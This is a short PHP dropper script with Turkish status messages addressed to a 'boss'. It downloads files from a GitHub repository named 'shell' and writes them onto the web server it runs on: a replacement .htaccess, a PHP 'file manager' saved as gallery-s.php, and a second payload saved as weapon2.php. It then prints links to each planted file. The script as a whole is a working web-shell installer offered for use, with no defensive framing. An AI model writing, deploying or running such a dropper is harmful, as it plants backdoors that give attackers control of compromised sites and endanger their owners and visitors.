<?php
$file3 = '.htaccess';
$ht = file_get_contents('https://raw.githubusercontent.com/slizyoke/shell/master/ht-access-sample.txt');
file_put_contents($file3, $ht);
?>
htaccess dosyasi duzenlendi patron. <br>
<?php
$file1 = 'gallery-s.php';
$weapon1 = file_get_contents('https://raw.githubusercontent.com/slizyoke/shell/master/2.php');
file_put_contents($file1, $weapon1);
?>
File manager hazir patron. <a href="gallery-s.php">Buradan</a><br>
<?php
$file2 = 'weapon2.php';
$weapon2 = file_get_contents('https://raw.githubusercontent.com/slizyoke/shell/master/ttsm.php');
file_put_contents($file2, $weapon2);
?>
Tats hazir patron. <a href="weapon2.php">Buradan</a><br>
